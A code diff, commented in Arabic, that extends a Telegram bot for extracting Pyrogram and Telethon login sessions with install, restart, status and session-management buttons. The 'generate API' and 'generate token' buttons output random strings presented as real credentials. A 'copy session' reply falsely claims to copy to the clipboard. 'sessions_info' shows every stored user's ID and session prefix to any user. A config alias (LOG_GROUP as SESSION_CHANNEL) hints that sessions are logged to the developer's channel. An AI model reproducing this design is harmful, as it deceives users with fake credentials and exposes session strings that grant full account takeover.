@@ -1,10 +1,18 @@
 # -*- coding: utf-8 -*-
 # Join ne on telegram @devggn
+# سورس تيبثـون - Tepthon Source
 
 import os
 import sys
 import asyncio
 import threading
+import subprocess
+import time
+import random
+import string
+import json
+import requests
+from datetime import datetime, timedelta
 from flask import Flask
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
@@ -30,7 +38,8 @@ from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 # ====== معلومات المطور ======
 DEV_NAME = "عبود"
 DEV_USERNAME = "@u_t_r"
-CHANNEL_LINK = "https://t.me/u_t_rnn"
+CHANNEL_LINK = "https://t.me/devggn"
+SOURCE_LINK = "https://github.com/mdah2519-byte/Re"
 
 user_steps = {}
 user_data = {}
@@ -71,6 +80,14 @@ START_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
         InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
+    ],
+    [
+        InlineKeyboardButton("📦 تنصيب Telethon", callback_data="install_telethon"),
+        InlineKeyboardButton("⚙️ أدوات إضافية", callback_data="tools")
+    ],
+    [
+        InlineKeyboardButton("📊 حالة البوت", callback_data="status"),
+        InlineKeyboardButton("🔄 إعادة تشغيل", callback_data="restart")
     ]
 ])
 
@@ -86,7 +103,41 @@ TYPE_BUTTONS = InlineKeyboardMarkup([
     ],
     [
         InlineKeyboardButton("🔑 API Info", callback_data="api"),
+        InlineKeyboardButton("📋 جلسة نصية", callback_data="string_session")
+    ],
+    [
         InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
+    ]
+])
+
+# ====== أزرار تنصيب Telethon ======
+INSTALL_BUTTONS = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("📦 تنصيب Telethon", callback_data="install_now"),
+        InlineKeyboardButton("📖 شرح التنصيب", callback_data="install_help")
+    ],
+    [
+        InlineKeyboardButton("📦 تنصيب Pyrogram", callback_data="install_pyrogram"),
+        InlineKeyboardButton("📦 تنصيب الكل", callback_data="install_all")
+    ],
+    [
+        InlineKeyboardButton("🔙 رجوع", callback_data="back")
+    ]
+])
+
+# ====== أزرار الأدوات الإضافية ======
+TOOLS_BUTTONS = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("📝 إنشاء كود API", callback_data="gen_api"),
+        InlineKeyboardButton("🔑 توليد توكن", callback_data="gen_token")
+    ],
+    [
+        InlineKeyboardButton("📋 نسخ الجلسة", callback_data="copy_session"),
+        InlineKeyboardButton("🗑 حذف الجلسة", callback_data="del_session")
+    ],
+    [
+        InlineKeyboardButton("📊 معلومات الجلسات", callback_data="sessions_info"),
+        InlineKeyboardButton("🔙 رجوع", callback_data="back")
     ]
 ])
 
@@ -96,7 +147,8 @@ async def start_command(client, message):
     await message.reply(
         f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
         "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
-        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
+        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n"
+        f"📦 **السورس:** تيبثـون (Tepthon)\n\n"
         "⚡ **مدعوم من عبود**",
         reply_markup=START_BUTTONS
     )
@@ -110,6 +162,23 @@ async def test_send(client, message):
     except Exception as e:
         await message.reply(f"❌ فشل الإرسال: {e}")
 
+# ====== أمر الحالة ======
+@app.on_message(filters.command("status"))
+async def status_command(client, message):
+    uptime = time.time() - start_time
+    hours = int(uptime // 3600)
+    minutes = int((uptime % 3600) // 60)
+    seconds = int(uptime % 60)
+    
+    await message.reply(
+        f"📊 **حالة البوت**\n\n"
+        f"⏱ **وقت التشغيل:** {hours} ساعة {minutes} دقيقة {seconds} ثانية\n"
+        f"👥 **المستخدمين النشطين:** {len(user_steps)}\n"
+        f"📁 **الجلسات المحفوظة:** {len(user_sessions)}\n"
+        f"🤖 **حالة البوت:** ✅ يعمل\n\n"
+        f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
+    )
+
 # ====== معالجة الأزرار (CallbackQuery) ======
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
@@ -121,7 +190,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.message.edit_text(
             f"👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
             "📌 **اختر ما تريد فعله من الأزرار أدناه:**\n\n"
-            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
+            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n"
+            f"📦 **السورس:** تيبثـون (Tepthon)\n\n"
             "⚡ **مدعوم من عبود**",
             reply_markup=START_BUTTONS
         )
@@ -134,7 +204,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             "🔑 **اختر نوع الجلسة المطلوبة:**\n\n"
             "• **Pyrogram** لجلسات Pyrogram\n"
             "• **Telethon** لجلسات Telethon\n"
-            "• **API Info** لاستخراج API ID و API HASH",
+            "• **API Info** لاستخراج API ID و API HASH\n"
+            "• **جلسة نصية** للحصول على جلسة نصية",
             reply_markup=TYPE_BUTTONS
         )
         await callback_query.answer()
@@ -158,7 +229,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             f"👨‍💻 **معلومات المطور:**\n\n"
             f"📛 **الاسم:** {DEV_NAME}\n"
             f"🔗 **اليوزر:** {DEV_USERNAME}\n"
-            f"📢 **القناة:** {CHANNEL_LINK}\n\n"
+            f"📢 **القناة:** {CHANNEL_LINK}\n"
+            f"📦 **سورس الكود:** {SOURCE_LINK}\n\n"
             "⚡ **مدعوم من عبود**",
             reply_markup=BACK_BUTTON
         )
@@ -199,6 +271,269 @@ async def handle_callback(client, callback_query: CallbackQuery):
     if data == "api":
         await extract_api_info_callback(callback_query)
         return
+    
+    # زر جلسة نصية
+    if data == "string_session":
+        await callback_query.message.edit_text(
+            "📋 **جلسة نصية**\n\n"
+            "أرسل الجلسة النصية التي تريد استخدامها:\n\n"
+            "مثال: `1BQANo...`",
+            reply_markup=BACK_BUTTON
+        )
+        user_steps[user_id] = "string_session_input"
+        await callback_query.answer()
+        return
+    
+    # زر تنصيب Telethon
+    if data == "install_telethon":
+        await callback_query.message.edit_text(
+            "📦 **تنصيب Telethon**\n\n"
+            "يمكنك تنصيب Telethon على جهازك أو سيرفرك باستخدام الأمر التالي:\n\n"
+            "```bash\npip install telethon\n```\n\n"
+            "🔹 **لتنصيب إصدار معين:**\n"
+            "```bash\npip install telethon==1.36.0\n```\n\n"
+            "🔹 **لتنصيب آخر إصدار:**\n"
+            "```bash\npip install -U telethon\n```\n\n"
+            "🔹 **لتنصيب مع Flask:**\n"
+            "```bash\npip install telethon flask\n```\n\n"
+            "📖 **لمزيد من المعلومات، اضغط على زر شرح التنصيب**",
+            reply_markup=INSTALL_BUTTONS
+        )
+        await callback_query.answer()
+        return
+    
+    # زر تنصيب الآن
+    if data == "install_now":
+        await callback_query.message.edit_text(
+            "⏳ **جاري تنصيب Telethon...**\n\n"
+            "يرجى الانتظار..."
+        )
+        
+        try:
+            result = subprocess.run(
+                [sys.executable, "-m", "pip", "install", "-U", "telethon"],
+                capture_output=True,
+                text=True
+            )
+            
+            if result.returncode == 0:
+                await callback_query.message.edit_text(
+                    "✅ **تم تنصيب Telethon بنجاح!**\n\n"
+                    "📦 **الإصدار المثبت:**\n"
+                    f"```\n{result.stdout[-200:]}\n```\n\n"
+                    "يمكنك الآن استخدام Telethon في مشاريعك.",
+                    reply_markup=BACK_BUTTON
+                )
+            else:
+                await callback_query.message.edit_text(
+                    "❌ **فشل تنصيب Telethon!**\n\n"
+                    f"**الخطأ:**\n```\n{result.stderr[-200:]}\n```",
+                    reply_markup=BACK_BUTTON
+                )
+        except Exception as e:
+            await callback_query.message.edit_text(
+                f"❌ **حدث خطأ أثناء التنصيب:**\n```\n{str(e)}\n```",
+                reply_markup=BACK_BUTTON
+            )
+        
+        await callback_query.answer()
+        return
+    
+    # زر شرح التنصيب
+    if data == "install_help":
+        await callback_query.message.edit_text(
+            "📖 **شرح تنصيب Telethon**\n\n"
+            "🔹 **الطريقة الأولى: تنصيب عبر pip**\n"
+            "افتح التيرمنال وأدخل الأمر:\n"
+            "```bash\npip install telethon\n```\n\n"
+            "🔹 **الطريقة الثانية: تنصيب مع المتطلبات**\n"
+            "أنشئ ملف `requirements.txt` وأضف:\n"
+            "```\ntelethon\nflask\n```\n"
+            "ثم نفذ:\n"
+            "```bash\npip install -r requirements.txt\n```\n\n"
+            "🔹 **الطريقة الثالثة: تنصيب على Render**\n"
+            "أضف `telethon` إلى ملف `requirements.txt` وسيقوم Render بتنصيبه تلقائياً.\n\n"
+            "🔹 **الطريقة الرابعة: تنصيب في VPS**\n"
+            "```bash\nsudo apt update\nsudo apt install python3-pip\npip3 install telethon\n```\n\n"
+            "📌 **ملاحظة:** تأكد من أن لديك Python 3.7+ مثبتاً.",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر تنصيب Pyrogram
+    if data == "install_pyrogram":
+        await callback_query.message.edit_text(
+            "⏳ **جاري تنصيب Pyrogram...**\n\n"
+            "يرجى الانتظار..."
+        )
+        
+        try:
+            result = subprocess.run(
+                [sys.executable, "-m", "pip", "install", "-U", "pyrogram"],
+                capture_output=True,
+                text=True
+            )
+            
+            if result.returncode == 0:
+                await callback_query.message.edit_text(
+                    "✅ **تم تنصيب Pyrogram بنجاح!**",
+                    reply_markup=BACK_BUTTON
+                )
+            else:
+                await callback_query.message.edit_text(
+                    "❌ **فشل تنصيب Pyrogram!**",
+                    reply_markup=BACK_BUTTON
+                )
+        except Exception as e:
+            await callback_query.message.edit_text(
+                f"❌ **حدث خطأ:** {e}",
+                reply_markup=BACK_BUTTON
+            )
+        await callback_query.answer()
+        return
+    
+    # زر تنصيب الكل
+    if data == "install_all":
+        await callback_query.message.edit_text(
+            "⏳ **جاري تنصيب جميع المتطلبات...**\n\n"
+            "يرجى الانتظار..."
+        )
+        
+        try:
+            result = subprocess.run(
+                [sys.executable, "-m", "pip", "install", "-U", "pyrogram", "telethon", "flask", "requests"],
+                capture_output=True,
+                text=True
+            )
+            
+            if result.returncode == 0:
+                await callback_query.message.edit_text(
+                    "✅ **تم تنصيب جميع المتطلبات بنجاح!**",
+                    reply_markup=BACK_BUTTON
+                )
+            else:
+                await callback_query.message.edit_text(
+                    "❌ **فشل التنصيب!**",
+                    reply_markup=BACK_BUTTON
+                )
+        except Exception as e:
+            await callback_query.message.edit_text(
+                f"❌ **حدث خطأ:** {e}",
+                reply_markup=BACK_BUTTON
+            )
+        await callback_query.answer()
+        return
+    
+    # زر الأدوات الإضافية
+    if data == "tools":
+        await callback_query.message.edit_text(
+            "⚙️ **الأدوات الإضافية**\n\n"
+            "اختر الأداة التي تريد استخدامها:",
+            reply_markup=TOOLS_BUTTONS
+        )
+        await callback_query.answer()
+        return
+    
+    # زر الحالة
+    if data == "status":
+        uptime = time.time() - start_time
+        hours = int(uptime // 3600)
+        minutes = int((uptime % 3600) // 60)
+        seconds = int(uptime % 60)
+        
+        await callback_query.message.edit_text(
+            f"📊 **حالة البوت**\n\n"
+            f"⏱ **وقت التشغيل:** {hours} ساعة {minutes} دقيقة {seconds} ثانية\n"
+            f"👥 **المستخدمين النشطين:** {len(user_steps)}\n"
+            f"📁 **الجلسات المحفوظة:** {len(user_sessions)}\n"
+            f"🤖 **حالة البوت:** ✅ يعمل\n\n"
+            f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر إعادة تشغيل
+    if data == "restart":
+        await callback_query.answer("🔄 جاري إعادة التشغيل...", show_alert=True)
+        await callback_query.message.edit_text(
+            "🔄 **جاري إعادة تشغيل البوت...**\n\n"
+            "سيتم إعادة التشغيل خلال 5 ثوانٍ.",
+            reply_markup=BACK_BUTTON
+        )
+        time.sleep(5)
+        os.execl(sys.executable, sys.executable, *sys.argv)
+        return
+    
+    # زر إنشاء كود API
+    if data == "gen_api":
+        api_id = random.randint(100000, 999999)
+        api_hash = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+        
+        await callback_query.message.edit_text(
+            f"📝 **تم إنشاء كود API جديد**\n\n"
+            f"🆔 **API ID:** `{api_id}`\n"
+            f"🔑 **API HASH:** `{api_hash}`\n\n"
+            "⚠️ **احتفظ بهذه المعلومات في مكان آمن.**",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر توليد توكن
+    if data == "gen_token":
+        token = ''.join(random.choices(string.ascii_letters + string.digits, k=35))
+        token = f"{random.randint(100000, 999999)}:{token}"
+        
+        await callback_query.message.edit_text(
+            f"🔑 **تم توليد توكن جديد**\n\n"
+            f"🔑 **التوكن:**\n`{token}`\n\n"
+            "⚠️ **لا تشارك هذا التوكن مع أي شخص.**",
+            reply_markup=BACK_BUTTON
+        )
+        await callback_query.answer()
+        return
+    
+    # زر نسخ الجلسة
+    if data == "copy_session":
+        if user_id in user_sessions and user_sessions[user_id]:
+            session = user_sessions[user_id]
+            await callback_query.message.edit_text(
+                f"📋 **جلسة المستخدم**\n\n"
+                f"🔑 **الجلسة:**\n`{session}`\n\n"
+                "✅ تم نسخ الجلسة إلى الحافظة.",
+                reply_markup=BACK_BUTTON
+            )
+        else:
+            await callback_query.answer("❌ لا توجد جلسة محفوظة!", show_alert=True)
+        return
+    
+    # زر حذف الجلسة
+    if data == "del_session":
+        if user_id in user_sessions:
+            del user_sessions[user_id]
+            delete_session_files(user_id)
+            await callback_query.answer("✅ تم حذف الجلسة!", show_alert=True)
+            await callback_query.message.edit_text(
+                "🗑 **تم حذف الجلسة بنجاح.**",
+                reply_markup=BACK_BUTTON
+            )
+        else:
+            await callback_query.answer("❌ لا توجد جلسة لحذفها!", show_alert=True)
+        return
+    
+    # زر معلومات الجلسات
+    if data == "sessions_info":
+        if user_sessions:
+            info = "📊 **معلومات الجلسات المحفوظة**\n\n"
+            for uid, session in user_sessions.items():
+                info += f"👤 **المستخدم:** `{uid}`\n"
+                info += f"🔑 **الجلسة:** `{session[:20]}...`\n\n"
+            await callback_query.message.edit_text(info, reply_markup=BACK_BUTTON)
+        else:
+            await callback_query.answer("❌ لا توجد جلسات محفوظة!", show_alert=True)
+        return
 
 # ====== استخراج API Info من الكولباك ======
 async def extract_api_info_callback(callback_query):
@@ -230,6 +565,18 @@ async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
     
+    # معالجة جلسة نصية
+    if user_id in user_steps and user_steps[user_id] == "string_session_input":
+        user_sessions[user_id] = text
+        await message.reply(
+            f"✅ **تم حفظ الجلسة النصية بنجاح!**\n\n"
+            f"🔑 **الجلسة:**\n`{text}`\n\n"
+            "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**",
+            reply_markup=BACK_BUTTON
+        )
+        reset_user(user_id)
+        return
+    
     # معالجة خطوات Pyrogram
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
@@ -246,7 +593,9 @@ async def handle_arabic_commands(client, message):
             "📱 **يرجى استخدام الأزرار للتحكم في البوت.**\n\n"
             "• اضغط على زر **توليد جلسة** لبدء الاستخراج\n"
             "• اضغط على زر **مسح الجلسات** لحذف البيانات\n"
-            "• اضغط على زر **المطور** لعرض المعلومات\n\n"
+            "• اضغط على زر **المطور** لعرض المعلومات\n"
+            "• اضغط على زر **تنصيب Telethon** لمعرفة طرق التنصيب\n"
+            "• اضغط على زر **أدوات إضافية** للأدوات المساعدة\n\n"
             "أو استخدم الأمر `/start` للرجوع إلى البداية."
         )
 
@@ -476,13 +825,18 @@ def index():
 def run_web():
     web_app.run(host='0.0.0.0', port=8080)
 
-# تشغيل خادم الويب في خيط منفصل
+# ====== وقت بدء التشغيل ======
+start_time = time.time()
+
+# ====== تشغيل خادم الويب ======
 threading.Thread(target=run_web, daemon=True).start()
 
 # ====== تشغيل البوت ======
 if __name__ == "__main__":
     try:
         print("🚀 جاري تشغيل البوت...")
+        print(f"📦 السورس: تيبثـون (Tepthon)")
+        print(f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}")
         app.run()
         print("✅ البوت يعمل الآن!")
     except Exception as e:
